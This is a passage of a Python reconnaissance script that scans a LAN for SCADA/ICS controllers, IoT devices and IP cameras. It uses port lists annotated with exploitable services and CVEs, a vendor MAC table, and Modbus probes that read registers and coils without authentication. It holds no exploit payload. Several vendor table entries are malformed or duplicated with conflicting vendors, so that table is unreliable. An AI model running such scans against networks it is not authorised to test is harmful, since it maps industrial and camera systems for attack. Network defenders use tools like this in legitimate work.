#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║       LAN Recon — Ultimate IoT / SCADA / Camera Device Discovery           ║
║       Identifies industrial, IoT, and IP camera devices on LAN             ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  Usage : sudo python3 recon_iot_scada.py <network/cidr>                    ║
║  Deps  : pip install python-nmap scapy                                     ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

import sys
import os
import re
import socket
import struct
import time
import shutil
import subprocess
import ipaddress
import argparse
import threading
import base64
import atexit
import signal
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Dependency checks ─────────────────────────────────────────────────────────
try:
    import nmap
except ImportError:
    print("[!] python-nmap not found.  Run: pip install python-nmap")
    sys.exit(1)

# Script's own directory — used for output file placement
SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))

try:
    import warnings
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")
        from scapy.all import ARP, Ether, srp, conf as _scapy_conf
    _scapy_conf.verb = 0
    SCAPY_AVAILABLE = True
except Exception:
    # Catches ImportError (not installed) and PermissionError / OSError
    # (scapy tries to open raw netlink sockets at import time — fails rootless)
    SCAPY_AVAILABLE = False
    print("[~] scapy unavailable — will use nmap ping sweep instead.")


# ─────────────────────────────────────────────────────────────────────────────
# PORT DEFINITIONS
# ─────────────────────────────────────────────────────────────────────────────

# SCADA / ICS
SCADA_TCP_PORTS = [
    89,     # Tridium legacy
    102,    # Siemens S7 / TPKT / IEC 61850 MMS
    502,    # Modbus/TCP
    1911,   # Tridium Niagara Fox — building automation (HVAC, access, lighting)
    1962,   # PCWorx (Phoenix Contact)
    2404,   # IEC 60870-5-104
    4840,   # OPC UA
    4000,   # Emerson DeltaV
    4001,   # Emerson DeltaV
    4911,   # Tridium Niagara Fox SSL
    5007,   # Mitsubishi MELSEC-Q
    9600,   # OMRON FINS
    18245,  # GE SRTP
    20000,  # DNP3
    20547,  # ProConOS (Phoenix Contact)
    44818,  # EtherNet/IP (CIP)
    2455,   # WAGO
    34980,  # EtherNet/IP explicit messaging
]
SCADA_UDP_PORTS = [
    47808,  # BACnet/IP
    2222,   # EtherNet/IP I/O
    34962,  # PROFINET RT (cyclic)
    34963,  # PROFINET RT (acyclic)
    34964,  # PROFINET DCP
    9600,   # OMRON FINS UDP
]

# IoT
IOT_TCP_PORTS = [
    21,     # FTP
    22,     # SSH
    23,     # Telnet
    80,     # HTTP admin
    139,    # NetBIOS Session Service (SMB legacy)
    443,    # HTTPS admin
    445,    # SMB / Windows file sharing
    2375,   # Docker daemon API (unauthenticated = instant host root)
    3389,   # RDP (BlueKeep / Windows remote desktop)
    1883,   # MQTT
    4786,   # Cisco Smart Install (CSI) — unauthenticated config r/w, firmware replace
    5222,   # XMPP
    2049,   # NFS — unauthenticated share mount
    5432,   # PostgreSQL — default/no-auth database
    5672,   # AMQP
    6379,   # Redis — unauthenticated / default no-password
    7001,   # Oracle WebLogic — CVE-2019-2725 pre-auth RCE (T3/IIOP deserialization)
    8009,   # Apache Tomcat AJP — CVE-2020-1938 Ghostcat file read/inclusion
    6668,   # Tuya local control (TCP)
    7547,   # TR-069 (CWMP)
    8080,   # HTTP-Alt
    8291,   # MikroTik Winbox — CVE-2018-14847 unauthenticated credential extraction
    8443,   # HTTPS-Alt
    8728,   # MikroTik API (unencrypted)
    8883,   # MQTT/SSL
    8888,   # HTTP admin alt
    9000,   # HTTP misc
]
IOT_UDP_PORTS = [
    # NOTE: SNMP (161) is NOT here — nmap UDP scanning is too slow for it.
    # We probe port 161 directly in run_probes() instead (fast UDP send/recv).
    623,    # IPMI / RMCP — BMC out-of-band management (servers, switches, routers)
    1900,   # UPnP / SSDP
    3702,   # WS-Discovery (ONVIF camera self-announcement)
    5353,   # mDNS / Bonjour
    5683,   # CoAP
    5684,   # CoAP/DTLS
    6666,   # Tuya local discovery
    6667,   # Tuya local discovery (encrypted)
    37020,  # Hikvision SADP — device discovery / serial / firmware / SDK port
]

# IP Camera / CCTV
CAM_TCP_PORTS = [
    554,    # RTSP
    8554,   # RTSP alt
    1935,   # RTMP
    37777,  # Dahua TCP
    34567,  # Dahua UDP TCP alt
    37778,  # Dahua RTSP
    8899,   # Swann / Zmodo
    9527,   # Various DVR
    34599,  # Dahua mobile
    5000,   # Hikvision SDK
    8000,   # Hikvision SDK alt
]
ALL_TCP_PORTS = sorted(set(SCADA_TCP_PORTS + IOT_TCP_PORTS + CAM_TCP_PORTS))
ALL_UDP_PORTS = sorted(set(SCADA_UDP_PORTS + IOT_UDP_PORTS))

SCADA_PORTS_SET = set(SCADA_TCP_PORTS + SCADA_UDP_PORTS)
IOT_PORTS_SET   = set(IOT_TCP_PORTS   + IOT_UDP_PORTS)
CAM_PORTS_SET   = set(CAM_TCP_PORTS)

# Human-readable protocol name per port
PORT_LABEL = {
    # SCADA
    89:    'ATISSR',
    102:   'S7/TPKT (Siemens)',
    502:   'Modbus/TCP',
    1962:  'PCWorx (Phoenix Contact)',
    2404:  'IEC 60870-5-104',
    4840:  'OPC UA',
    4000:  'Emerson DeltaV',
    4001:  'Emerson DeltaV',
    5007:  'Mitsubishi MELSEC-Q',
    9600:  'OMRON FINS',
    18245: 'GE SRTP',
    20000: 'DNP3',
    20547: 'ProConOS',
    44818: 'EtherNet/IP (CIP)',
    2455:  'WAGO',
    34980: 'EtherNet/IP explicit',
    47808: 'BACnet/IP',
    2222:  'EtherNet/IP I/O',
    34962: 'PROFINET RT cyclic',
    34963: 'PROFINET RT acyclic',
    34964: 'PROFINET DCP',
    # IoT
    21:    'FTP',
    22:    'SSH',
    23:    'Telnet',
    80:    'HTTP',
    139:   'NetBIOS (SMB)',
    443:   'HTTPS',
    445:   'SMB / CIFS',
    2049:  'NFS',
    1883:  'MQTT',
    5222:  'XMPP',
    5353:  'mDNS',
    5672:  'AMQP',
    5683:  'CoAP',
    5684:  'CoAP/DTLS',
    7547:  'TR-069 (CWMP)',
    8080:  'HTTP-Alt',
    8443:  'HTTPS-Alt',
    8883:  'MQTT/SSL',
    8888:  'HTTP Admin',
    161:   'SNMP',
    1900:  'UPnP/SSDP',
    3702:  'WS-Discovery',
    6666:  'Tuya local discovery',
    6667:  'Tuya local discovery (enc)',
    6668:  'Tuya local control',
    9000:  'HTTP misc',
    5432:  'PostgreSQL',
    6379:  'Redis',
    7001:  'Oracle WebLogic',
    8009:  'Tomcat AJP (Ghostcat)',
    # Camera
    554:   'RTSP',
    8554:  'RTSP-Alt',
    1935:  'RTMP',
    37777: 'Dahua TCP',
    34567: 'DVR/NVR TCP',
    37778: 'Dahua RTSP',
    8899:  'DVR (Swann/Zmodo)',
    9527:  'DVR misc',
    34599: 'Dahua mobile',
    5000:  'Hikvision SDK',
    8000:  'Hikvision SDK',
    34568: 'Dahua UDP search',
    37020: 'Hikvision discovery',
    4786:  'Cisco Smart Install',
    8291:  'MikroTik Winbox',
    8728:  'MikroTik API',
}

PROBE_TIMEOUT = 3

VERSION = "1.0.0"


# ─────────────────────────────────────────────────────────────────────────────
# OUI DATABASE
# ─────────────────────────────────────────────────────────────────────────────

# Subset focused on SCADA, IoT, and camera vendors.
# Keys = uppercase hex, no separators, first 3 bytes (6 chars).
BUILTIN_OUI = {
    # Siemens
    '001A4E': 'Siemens AG',
    '0019A7': 'Siemens AG',
    '001CEF': 'Siemens AG',
    '000E8C': 'Siemens AG',
    # Rockwell Automation / Allen-Bradley
    '000BC5': 'Rockwell Automation',
    '001D9C': 'Rockwell Automation',
    '0050BF': 'Rockwell Automation',
    '000E8F': 'Rockwell Automation',
    # Schneider Electric
    '0080F4': 'Schneider Electric',
    '00A070': 'Schneider Electric',
    '0000ED': 'Schneider Electric',
    '001EBD': 'Schneider Electric',
    # Honeywell
    '000CF8': 'Honeywell',
    '00808C': 'Honeywell',
    # ABB
    '000A14': 'ABB',
    '00104A': 'ABB',
    # GE / General Electric
    '001CF4': 'GE Automation',
    '0001F4': 'GE Fanuc',
    '0060E9': 'GE Industrial',
    # Mitsubishi Electric
    '00E0E9': 'Mitsubishi Electric',
    '00B0C7': 'Mitsubishi Electric',
    # Omron
    '00000A': 'OMRON',
    '00EEBD': 'OMRON',
    '000225': 'OMRON',
    # Phoenix Contact
    '000C29': 'Phoenix Contact',
    '00A05E': 'Phoenix Contact',
    # Beckhoff
    '001B45': 'Beckhoff Automation',
    # Moxa (serial/ethernet gateways, common in SCADA)
    '0090E8': 'Moxa Technologies',
    '00D09E': 'Moxa Technologies',
    '00C0A7': 'Moxa Technologies',
    # Emerson / Fisher-Rosemount
    '000A3A': 'Emerson Electric',
    '001275': 'Emerson Electric',
    # Yokogawa
    '002054': 'Yokogawa Electric',
    '000B28': 'Yokogawa Electric',
    # Advantech
    '0008A1': 'Advantech',
    '002590': 'Advantech',
    # Lantronix (serial device servers)
    '0080A3': 'Lantronix',
    '00C012': 'Lantronix',
    # WAGO
    '000A97': 'WAGO Kontakttechnik',
    # Pilz
    '001A86': 'Pilz GmbH',
    # TP-Link
    '14CC20': 'TP-Link Technologies',
    '50C7BF': 'TP-Link Technologies',
    'A0F3C1': 'TP-Link Technologies',
    'B0487A': 'TP-Link Technologies',
    'C46E1F': 'TP-Link Technologies',
    '54A74E': 'TP-Link Technologies',
    'F81A67': 'TP-Link Technologies',
    '300514': 'TP-Link Technologies',
    # D-Link
    '00265A': 'D-Link',
    '1CBDB9': 'D-Link',
    '9094E4': 'D-Link',
    # Netgear
    '00146C': 'Netgear',
    '28C68E': 'Netgear',
    '20E52A': 'Netgear',
    # Ubiquiti
    '0418D6': 'Ubiquiti Networks',
    '24A43C': 'Ubiquiti Networks',
    'DC9FDB': 'Ubiquiti Networks',
    'FC:EC:DA': 'Ubiquiti Networks',
    # Raspberry Pi
    'B827EB': 'Raspberry Pi Foundation',
    'DCA632': 'Raspberry Pi Foundation',
    'E45F01': 'Raspberry Pi Foundation',
    '2CCF67': 'Raspberry Pi Foundation',
    # Espressif (ESP8266 / ESP32 IoT modules)
    'ECFABC': 'Espressif Inc (ESP)',
    '24B2DE': 'Espressif Inc (ESP)',
    '84F3EB': 'Espressif Inc (ESP)',
    'A4CF12': 'Espressif Inc (ESP)',
    '30AEA4': 'Espressif Inc (ESP)',
    '246F28': 'Espressif Inc (ESP)',
    '7CDFA1': 'Espressif Inc (ESP)',
    '40F520': 'Espressif Inc (ESP)',
    '18FE34': 'Espressif Inc (ESP)',
    # Philips Hue / Signify
    '001788': 'Signify / Philips Hue',
    'EC2D9D': 'Signify / Philips Hue',
    # Belkin / Wemo
    '94103E': 'Belkin International',
    'B4750E': 'Belkin International',
    'EC1A59': 'Belkin International',
    # Samsung (smart TVs, home devices)
    '002339': 'Samsung Electronics',
    '0021D1': 'Samsung Electronics',
    '8C7712': 'Samsung Electronics',
    '5CF7E6': 'Samsung Electronics',
    # LG Electronics
    '000E62': 'LG Electronics',
    'A8B860': 'LG Electronics',
    # Hikvision (IP cameras / DVR / NVR)
    'C05627': 'Hikvision Digital Technology',
    '4C1FCC': 'Hikvision Digital Technology',
    'BC1023': 'Hikvision Digital Technology',
    '44190B': 'Hikvision Digital Technology',
    '282504': 'Hikvision Digital Technology',
    # Dahua Technology (IP cameras)
    'E0501E': 'Dahua Technology',
    '90D7EB': 'Dahua Technology',
    '001881': 'Dahua Technology',
    # Axis Communications (IP cameras)
    '00408C': 'Axis Communications',
    'ACCC8E': 'Axis Communications',
    'B8A44F': 'Axis Communications',
    # Hanwha / Samsung Techwin
    'C80CC8': 'Hanwha Vision (Samsung Techwin)',
    '000E2E': 'Hanwha Vision',
    # Uniview (IP cameras)
    '201895': 'Uniview Technologies',
    # Reolink
    'EC71DB': 'Reolink Digital Technology',
    # Vivotek (IP cameras)
    '00D0F1': 'Vivotek',
    # Bosch Security Systems
    '0004A3': 'Bosch Security Systems',
    # Pelco
    '000CE5': 'Pelco',
    # Nest Labs (Google)
    '18B430': 'Nest Labs (Google)',
    '64DBA0': 'Nest Labs (Google)',
    # Amazon (Echo, Ring, etc.)
    '40B4CD': 'Amazon Technologies',
    '74C246': 'Amazon Technologies',
    'A002DC': 'Amazon Technologies',
    'FC6516': 'Amazon Technologies',
    '68370B': 'Amazon Technologies',
    # Apple (HomeKit, HomePod, etc.)
    '001451': 'Apple Inc',
    '000A27': 'Apple Inc',
    '3C5AB4': 'Apple Inc',
    # Shelly (smart relays)
    '3494B4': 'Allterco Robotics (Shelly)',
    # Tuya Smart (platform used by hundreds of white-label IoT brands)
    'D8F15B': 'Tuya Smart',
    '500291': 'Tuya Smart',
    'A08908': 'Tuya Smart',
    'C44F33': 'Tuya Smart',
    '7C87CE': 'Tuya Smart',
    '68ABBC': 'Tuya Smart',
    '7403BD': 'Tuya Smart',
    'B4E842': 'Tuya Smart',
    '105A17': 'Tuya Smart',
    'C83A35': 'Tuya Smart',
    # Wyze
    '2CAA8E': 'Wyze Labs',
    # Ring
    'B02A4C': 'Ring (Amazon)',
    # MikroTik
    '4C5E0C': 'MikroTik',
    '6C3B6B': 'MikroTik',
    'E48D8C': 'MikroTik',
    # Cisco
    '00000C': 'Cisco Systems',
    '0001C7': 'Cisco Systems',
    '0023EB': 'Cisco Systems',
    # ── Additional SCADA / ICS ───────────────────────────────────────────────
    # HMS Industrial Networks (Anybus, eWON, Netbiter)
    '003011': 'HMS Industrial Networks',
    '000752': 'HMS Industrial Networks',
    # Hirschmann Automation / Belden (industrial Ethernet switches)
    '008063': 'Hirschmann Automation (Belden)',
    '000E0E': 'Hirschmann Automation (Belden)',
    # National Instruments / NI
    '00802F': 'National Instruments',
    '001FB9': 'National Instruments',
    '0026B9': 'National Instruments',
    # Digi International (serial/IoT gateways)
    '00409D': 'Digi International',
    '001517': 'Digi International',
    '0040A5': 'Digi International',
    # B&R Industrial Automation
    '00C07D': 'B&R Industrial Automation',
    # TURCK (industrial sensors / fieldbus)
    '0007E8': 'TURCK',
    # ifm electronic (sensors / I/O modules)
    '0006F5': 'ifm electronic',
    # SICK AG (sensors, safety)
    '000C52': 'SICK AG',
    '00E0FE': 'SICK AG',
    # Festo (pneumatics / industrial automation)
    '000EF0': 'Festo AG',
    # Lenze (drives / automation)
    '001941': 'Lenze SE',
    # Weidmüller (terminal blocks / I/O)
    '001EC0': 'Weidmüller Interface',
    # Belden (industrial cabling / networking, also Hirschmann parent)
    '0004DF': 'Belden',
    # Westermo (industrial routers)
    '0007A8': 'Westermo Network Technologies',
    # ProSoft Technology (communication modules for PLCs)
    '001A85': 'ProSoft Technology',
    # Red Lion Controls (HMI / protocol conversion)
    '0006EA': 'Red Lion Controls',
    # Opto 22 (I/O systems, SNAP PAC)
    '000084': 'Opto 22',
    # Koyo / AutomationDirect (PLCs)
    '000B99': 'Koyo Electronics / AutomationDirect',
    # IDEC Corporation (PLCs / HMIs)
    '00041B': 'IDEC Corporation',
    # Yaskawa Electric (servo drives / robots)
    '000773': 'Yaskawa Electric',
    # Fanuc (CNC / robotics)
    '00113D': 'Fanuc Corporation',
    # KUKA Roboter
    '000C78': 'KUKA Roboter GmbH',
    # Pepperl+Fuchs (sensors / intrinsic safety)
    '000AF8': 'Pepperl+Fuchs',
    # Endress+Hauser (process instrumentation)
    '000705': 'Endress+Hauser',
    # Danfoss (drives / HVAC controls)
    '00606F': 'Danfoss A/S',
    # SEW-EURODRIVE (drives)
    '001A66': 'SEW-EURODRIVE',
    # Murrelektronik (field bus infrastructure)
    '0013A6': 'Murrelektronik GmbH',
    # Rittal (enclosures / cooling — network-connected)
    '000DA3': 'Rittal GmbH',
    # ── Additional IP Camera / CCTV ──────────────────────────────────────────
    # Additional Hikvision OUIs
    'BCAD28': 'Hikvision Digital Technology',
    '4CEB BD': 'Hikvision Digital Technology',
    '285B81': 'Hikvision Digital Technology',
    '3CEF8C': 'Hikvision Digital Technology',
    '50E549': 'Hikvision Digital Technology',
    # Additional Dahua OUIs
    '4C11BF': 'Dahua Technology',
    '305A3A': 'Dahua Technology',
    'A46CF1': 'Dahua Technology',
    # EZVIZ (Hikvision consumer brand)
    '9C685B': 'EZVIZ (Hikvision)',
    'E8B8A0': 'EZVIZ (Hikvision)',
    # Avigilon (Motorola Solutions)
    '00186E': 'Avigilon Corporation',
    '000AF3': 'Avigilon Corporation',
    '5800E9': 'Avigilon Corporation',
    # FLIR Systems (thermal / IP cameras)
    '1866DA': 'FLIR Systems',
    '000D9A': 'FLIR Systems',
    # MOBOTIX AG
    '000C2D': 'MOBOTIX AG',
    # Sony Corporation (Sony cameras / NVR)
    '00014A': 'Sony Corporation',
    '001A80': 'Sony Corporation',
    # Hanwha Vision — additional OUIs
    '000918': 'Hanwha Vision',
    '00166E': 'Hanwha Vision',
    # GeoVision (IP cameras / access control)
    '000B97': 'GeoVision Inc',
    # ACTi Corporation (IP cameras)
    '000399': 'ACTi Corporation',
    # Vivotek — additional
    '000D96': 'Vivotek',
    # Milesight (IP cameras / IoT gateways)
    '2CAA8E': 'Milesight Technology',
    # Tiandy Technologies
    '9C8ECD': 'Tiandy Technologies',
    # Foscam Digital Technologies
    '00266C': 'Foscam Digital Technologies',
    # Arecont Vision
    '00188E': 'Arecont Vision',
    # IndigoVision
    '0013F1': 'IndigoVision',
    # March Networks
    '000462': 'March Networks',
    # Digital Watchdog
    '001CF0': 'Digital Watchdog',
    # Amcrest Technologies (Dahua OEM)
    '9C8E99': 'Amcrest Technologies',
    # Lorex Technology (FLIR subsidiary)
    '00265F': 'Lorex Technology',
    # Swann Communications
    '002765': 'Swann Communications',
    # Provision-ISR
    '001659': 'Provision-ISR',
    # CP Plus / Aditya Infotech
    '000316': 'CP Plus',
    # ── Additional IoT / Smart Home ──────────────────────────────────────────
    # IKEA of Sweden (Tradfri smart home)
    '000B57': 'IKEA of Sweden',
    '786A89': 'IKEA of Sweden',
    # LIFX (smart bulbs)
    'D073D5': 'LIFX',
    # Sonos (smart speakers)
    '000E58': 'Sonos Inc',
    '5CAAD4': 'Sonos Inc',
    'B8E937': 'Sonos Inc',
    # Ecobee (smart thermostats)
    '44619F': 'Ecobee Inc',
    # Arlo Technologies (cameras / home security)
    '20F5EA': 'Arlo Technologies',
    # Eufy Security / Anker Innovations
    '6CF1FE': 'Anker Innovations (Eufy)',
    # DoorBird / Bird Home Automation
    '1CCAE3': 'Bird Home Automation (DoorBird)',
    # 2N Telecommunications (IP intercoms)
    '000EE8': '2N Telecommunications',
    # Eero (Amazon mesh WiFi)
    '40D855': 'Eero (Amazon)',
    # ASUS (routers / smart home)
    '00E04C': 'ASUSTek Computer',
    '049226': 'ASUSTek Computer',
    'AC220B': 'ASUSTek Computer',
    # Linksys (Belkin)
    '001310': 'Linksys',
    '001CF0': 'Linksys',
    # Synology (NAS)
    '001132': 'Synology Inc',
    '0011320': 'Synology Inc',
    # QNAP Systems (NAS)
    '247703': 'QNAP Systems',
    '0008A8': 'QNAP Systems',
    # Western Digital (NAS / IoT storage)
    '000C50': 'Western Digital',
    '0090A9': 'Western Digital',
    # Silicon Labs (IoT chips — Zigbee/Z-Wave hub manufacturers)
    '000B57': 'Silicon Laboratories',
    # Sonoff / ITEAD Studio
    '10521C': 'ITEAD Studio (Sonoff)',
    'E8DB84': 'ITEAD Studio (Sonoff)',
    # Nanoleaf (smart lighting panels)
    'A0556E': 'Nanoleaf',
    # Govee Home
    'A4C138': 'Govee',
    # Roku (streaming devices)
    'B00414': 'Roku Inc',
    'AC3A7A': 'Roku Inc',
    'CC6EDA': 'Roku Inc',
    # Logitech (Harmony hub, etc.)
    '00F020': 'Logitech',
    'B4AEE3': 'Logitech',
    # Google (Chromecast, Nest WiFi, etc.)
    '1CB72C': 'Google LLC',
    '3C5AB4': 'Google LLC',
    '48D705': 'Google LLC',
    'F4F5E8': 'Google LLC',
    # Fibaro (Z-Wave smart home)
    '000479': 'Fibaro',
    # Vera Control (SmartHome hub)
    '006037': 'Vera Control',
    # Daikin Industries (network-connected AC units)
    '0030D3': 'Daikin Industries',
    # Sharp Corporation (IEEE confirmed, WiFi-connected AC/appliances)
    '00041E': 'Sharp Corporation',
    # Hitachi Cable (IEEE confirmed, Hitachi WiFi-connected AC)
    '000087': 'Hitachi Cable',
    # Fujitsu Limited (IEEE confirmed, Airstage WiFi AC)
    '000B5D': 'Fujitsu Limited',
}

# Keywords for SCADA/ICS vendor classification
SCADA_VENDOR_KW = {
    # Big automation vendors
    'siemens', 'rockwell', 'allen-bradley', 'schneider', 'honeywell',
    'abb', 'ge fanuc', 'ge automation', 'ge industrial', 'ge digital',
    'ge proficy', 'mitsubishi electric', 'omron', 'phoenix contact',
    'beckhoff', 'moxa', 'emerson', 'emerson electric', 'yokogawa',
    'advantech', 'lantronix', 'wago', 'pilz', 'keyence', 'weintek',
    # Drives & motion
    'yaskawa', 'fanuc', 'kuka', 'bosch rexroth', 'parker hannifin',
    'parker automation', 'danfoss', 'sew-eurodrive', 'sew eurodrive',
    'lenze', 'kollmorgen', 'nidec', 'fuji electric',
    # Sensors & instrumentation
    'pepperl+fuchs', 'pepperl fuchs', 'endress+hauser', 'endress hauser',
    'turck', 'hans turck', 'ifm electronic', 'sick ag', 'sick sensor',
    'balluff', 'leuze', 'contrinex', 'vega grieshaber', 'krohne',
    'festo', 'smc corporation',
    # Industrial networking
    'hirschmann', 'belden industrial', 'westermo', 'ruggedcom',
    'prosoft', 'red lion', 'opto 22', 'digi international',
    'hms industrial', 'hms networks', 'anybus', 'ewon', 'netbiter',
    'hilscher', 'softing industrial',
    # Fieldbuses & I/O
    'weidmuller', 'weidmüller', 'murrelektronik', 'murr elektronik',
    'rittal', 'eaton', 'datexel', 'acromag', 'kontakttechnik',
    'b&r industrial', 'b&r automation',
    # SCADA software / historians
    'inductive automation', 'ignition', 'aveva', 'wonderware',
    'kepware', 'ge proficy', 'national instruments', 'ni corp',
    'automationdirect', 'koyo', 'idec', 'delta tau',
    # Note: 'bosch security' intentionally NOT here — it is a camera brand
}

# Keywords for IP camera vendor classification
CAM_VENDOR_KW = {
    # Tier-1 manufacturers
    'hikvision', 'dahua', 'axis communications', 'hanwha', 'samsung techwin',
    'uniview', 'reolink', 'vivotek', 'pelco', 'bosch security',
    # Professional / enterprise
    'avigilon', 'motorola solutions', 'milestone systems', 'genetec',
    'march networks', 'indigo vision', 'indigovision', 'arecont vision',
    'digital watchdog', 'speco technologies', 'vicon industries',
    'american dynamics', 'verint', 'dedicated micros',
    # Thermal & specialty
    'flir', 'flir systems', 'mobotix', 'geovision', 'acti corporation',
    'sony imaging', 'lilin', 'surveon', 'tiandy', 'milesight',
    # Consumer / prosumer
    'ezviz', 'amcrest', 'foscam', 'swann', 'annke', 'cp plus', 'cp-plus',
    'lorex', 'night owl', 'zmodo', 'provision-isr', 'tapo',
    'eufy', 'arlo', 'blink', 'doorbird', '2n telecommunications',
}

# Keywords for IoT consumer device classification
IOT_VENDOR_KW = {
    # Networking / gateways
    'tp-link', 'kasa smart', 'd-link', 'netgear', 'ubiquiti', 'linksys',
    'asus', 'mikrotik', 'eero',
    # Dev boards / modules
    'raspberry pi', 'espressif', 'arduino', 'particle industries',
    'nordic semiconductor', 'silicon labs', 'silicon laboratories',
    'microchip technology',
    # Smart lighting
    'signify', 'philips hue', 'lifx', 'nanoleaf', 'govee', 'sengled',
    'ikea of sweden', 'ledvance', 'osram',
    # Smart home hubs & plugs
    'belkin', 'wemo', 'shelly', 'allterco', 'sonoff', 'itead studio',
    'tuya', 'fibaro', 'vera control', 'smartthings',
    # Voice / streaming / media
    'nest labs', 'amazon technologies', 'apple inc', 'google llc',
    'roku', 'sonos', 'logitech',
    # Security / cameras (consumer-grade IoT)
    'wyze', 'ring', 'arlo technologies', 'blink', 'eufy', 'anker',
    # Consumer electronics
    'samsung electronics', 'lg electronics',
    # NAS / storage
    'synology', 'qnap', 'western digital',
    # Intercoms
    'bird home automation', '2n telecommunications',
    # Thermostat / climate / HVAC
    'ecobee', 'daikin',
    # WiFi-connected AC brands (broad coverage for banner/SNMP detection)
    'panasonic', 'fujitsu general', 'fujitsu', 'hitachi', 'toshiba',
    'sharp', 'haier', 'midea', 'gree electric', 'gree', 'aux air',
    'carrier', 'lennox', 'trane', 'york hvac', 'mitsubishi heavy',
    'mitsubishi electric hvac',
}


# ─────────────────────────────────────────────────────────────────────────────
# OUI LOOKUP
# ─────────────────────────────────────────────────────────────────────────────

class OUILookup:
    """MAC OUI vendor lookup — uses local file if available, else built-in DB."""

    def __init__(self, oui_file=None):
        self.db = {}
        loaded = False

        # User-supplied file takes priority
        candidates = []
        if oui_file:
            candidates.append(oui_file)

        # Auto-detect well-known system locations
        candidates += [
            'oui.txt',                              # current directory
            '/usr/share/nmap/nmap-mac-prefixes',    # nmap
            '/usr/share/wireshark/manuf',           # wireshark
            '/usr/share/misc/oui.txt',              # misc
        ]

        for path in candidates:
            if path and os.path.isfile(path):
                loaded = self._load_file(path)
                if loaded:
                    break

        if not loaded:
            self.db = BUILTIN_OUI.copy()
            print("[~] Using built-in OUI database. For full coverage, place oui.txt "
                  "next to the script (IEEE OUI or Wireshark manuf format).")

    def _load_file(self, path):
        count = 0
        try:
            with open(path, 'r', errors='ignore') as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue

                    # nmap-mac-prefixes:   "000000 Vendor Name"
                    # Also matches IEEE "(base 16)" lines — strip that prefix if present
                    m = re.match(r'^([0-9A-Fa-f]{6})\s+(.+)$', line)
                    if m:
                        vendor_raw = m.group(2).strip()
                        # IEEE OUI files have lines like: "BCDDС2     (base 16)    Espressif Inc."
                        vendor_raw = re.sub(r'^\(base 16\)\s*', '', vendor_raw, flags=re.IGNORECASE).strip()
                        if vendor_raw:
                            self.db[m.group(1).upper()] = vendor_raw
                            count += 1
                        continue

                    # Wireshark manuf:     "00:00:00  Short  Vendor Long Name"
                    m = re.match(r'^([0-9A-Fa-f]{2}):([0-9A-Fa-f]{2}):([0-9A-Fa-f]{2})\s+\S+\s+(.+)$', line)
                    if m:
                        key = (m.group(1) + m.group(2) + m.group(3)).upper()
                        self.db[key] = m.group(4).strip()
                        count += 1
                        continue

                    # IEEE OUI format:     "00-00-00   (hex)   Vendor Name"
                    m = re.match(r'^([0-9A-Fa-f]{2})-([0-9A-Fa-f]{2})-([0-9A-Fa-f]{2})\s+\(hex\)\s+(.+)$', line)
                    if m:
                        key = (m.group(1) + m.group(2) + m.group(3)).upper()
                        self.db[key] = m.group(4).strip()
                        count += 1

            if count:
                print(f"[+] Loaded {count:,} OUI entries from {path}")
                return True
        except Exception as e:
            print(f"[!] OUI file error ({path}): {e}")
        return False

    def lookup(self, mac: str) -> str:
        if not mac or mac in ('N/A', 'Unknown', ''):
            return 'Unknown'
        clean = re.sub(r'[:\-\.]', '', mac).upper()
        if len(clean) < 6:
            return 'Unknown'
        return self.db.get(clean[:6], 'Unknown')


# ─────────────────────────────────────────────────────────────────────────────
# PROTOCOL PROBES
# ─────────────────────────────────────────────────────────────────────────────

class ProtocolProber:
    """Sends targeted protocol handshakes to confirm and fingerprint devices."""

    def __init__(self, timeout=PROBE_TIMEOUT):
        self.timeout = timeout

    # ── helpers ──────────────────────────────────────────────────────────────

    def _tcp(self, ip, port):
        """Return connected socket or None."""
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((ip, port))
            return s
        except Exception:
            if s:
                try: s.close()
                except Exception: pass
            return None

    def _udp(self, ip, port, data, size=1024):
        """Send UDP, return response bytes or None."""
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(self.timeout)
            s.sendto(data, (ip, port))
            resp, _ = s.recvfrom(size)
            s.close()
            return resp
        except Exception:
            if s:
                try: s.close()
                except Exception: pass
            return None

    # ── Modbus/TCP — port 502 ────────────────────────────────────────────────

    def probe_modbus(self, ip):
        s = self._tcp(ip, 502)
        if not s:
            return None
        try:
            # FC 0x2B / MEI 0x0E — Read Device Identification (basic stream)
            req = struct.pack('>HHHB', 0x0001, 0x0000, 0x0005, 0x01)  # MBAP
            req += b'\x2B\x0E\x01\x00'  # FC, MEI type, read dev id code, object id
            s.sendall(req)
            resp = s.recv(256)
            s.close()
            if not resp or len(resp) < 8:
                return None
            result = {'protocol': 'Modbus/TCP', 'port': 502}
            # Parse device identification objects starting at byte 8
            try:
                offset = 8
                if len(resp) > offset + 4:
                    num_obj = resp[offset + 4]
                    o = offset + 5
                    names = {0: 'vendor', 1: 'product', 2: 'version'}
                    for _ in range(min(num_obj, 8)):
                        if o + 2 > len(resp):
                            break
                        oid  = resp[o]
                        olen = resp[o + 1]
                        val  = resp[o + 2: o + 2 + olen].decode('utf-8', errors='replace').strip()
                        if val:
                            result[names.get(oid, f'obj_{oid:02X}')] = val
                        o += 2 + olen
            except Exception:
                pass

            # FC3: Read Holding Registers (unauthenticated)
            try:
                s2 = self._tcp(ip, 502)
                if s2:
                    fc3 = struct.pack('>HHHBBHH', 0x0002, 0x0000, 0x0006,
                                      0x01, 0x03, 0x0000, 0x000A)
                    s2.sendall(fc3)
                    r3 = s2.recv(128)
                    s2.close()
                    if r3 and len(r3) > 9 and r3[7] == 0x03:
                        n_bytes = r3[8]
                        n_regs  = n_bytes // 2
                        if n_regs > 0 and len(r3) >= 9 + n_bytes:
                            regs = list(struct.unpack_from(f'>{n_regs}H', r3, 9))
                            result['holding_registers'] = regs[:10]
                            result['unauth_read'] = True
            except Exception:
                pass

            # FC1: Read Coils (unauthenticated)
            try:
                s3 = self._tcp(ip, 502)
                if s3:
                    fc1 = struct.pack('>HHHBBHH', 0x0003, 0x0000, 0x0006,
                                      0x01, 0x01, 0x0000, 0x0010)
                    s3.sendall(fc1)
                    r1 = s3.recv(64)
                    s3.close()
